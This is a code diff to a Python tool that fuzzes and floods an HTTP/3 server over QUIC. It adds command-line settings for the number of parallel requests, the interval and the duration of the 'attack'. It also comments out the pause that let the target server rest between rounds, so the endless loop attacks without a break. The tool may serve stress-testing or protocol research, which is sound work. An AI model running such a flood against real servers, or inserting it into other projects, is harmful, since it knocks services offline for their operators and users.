@@ -51,9 +51,6 @@ class HttpClient():
         self._quic = QuicConnection(configuration=self.quic_conf)
         self._http = H3Connection(self._quic)
         self.fuzzing_conf = fuzzing_conf
-
-    def __str__(self) -> str:
-        return json.dumps(self.__dict__, indent=1)
     
     def craft_sample_headers_frame(self):
         """
@@ -790,7 +787,8 @@ def execute_attack(fuzzing_conf: FuzzingConf, url: str, once: bool):
 def main(
     url: str,
     once: bool,
-    config_file: str = None # replicate fuzzing by reading values from a json file
+    attack_params: Dict,
+    config_file: str = None, # replicate fuzzing by reading values from a json file
 ) -> None:
 
     if once:
@@ -804,16 +802,20 @@ def main(
 
 
     def run_attack():
+        par_req = attack_params['parallel_requests']
+        duration = attack_params['duration']
+        interval = attack_params['interval']
+
         with concurrent.futures.ThreadPoolExecutor() as executor:
             futures = []
             print(fuzzing_conf)
-            print("\033[31mStart running the attack for with {} parallel connections {} times with {} sec interval\033[0m".format(20, 60, 1))
+            print("\033[31mStart running the attack for {} seconds with {} parallel connections and {} sec interval\033[0m".format(duration, par_req, interval))
             #while time.time() - attack_start_time < 61:            
-            for i in tqdm( range(0, 60), colour='red' ):
-                for i in range(20):
+            for i in tqdm( range(0, int(duration/interval)), colour='red' ):
+                for i in range(par_req):
                     # Submit each iteration as a separate task
                     futures.append(executor.submit(execute_attack, fuzzing_conf, url, once))
-                time.sleep(1)
+                time.sleep(interval)
 
 
     while True: # new attack parameters at every iteration
@@ -828,8 +830,8 @@ def main(
         print("\033[31mAttack Completes at {}\033[0m".format(attack_end_time_pretty))
         
         # Let the server rest
-        for i in tqdm( range(0, 30), colour='green' ):
-            time.sleep(1)
+        #for i in tqdm( range(0, 30), colour='green' ):
+        #    time.sleep(1)
         
 
     
@@ -850,15 +852,41 @@ if __name__ == "__main__":
         type=str,
         help="json file that contains parameters of past fuzzing to replicate"
     )
-
+    parser.add_argument(
+        "-p",
+        "--parallel-requests",
+        type=int,
+        default=20,
+        help="The number of requests to send in parallel"
+    )
+    parser.add_argument(
+        "-i",
+        "--interval",
+        type=int,
+        default=1,
+        help="Time to wait before sending the next parallel requests (in sec.)"
+    )
+    parser.add_argument(
+        "-d",
+        "--duration",
+        type=int,
+        default=60,
+        help="The length of attack (in sec.)"
+    )
 
     args = parser.parse_args()
 
+    attack_params = {
+        "parallel_requests": args.parallel_requests,
+        "interval": args.interval,
+        "duration": args.duration
+    }
     
     main(
             url=args.url,
             once=args.once,
-            config_file=args.config
+            attack_params=attack_params,
+            config_file=args.config,
         )
     
     
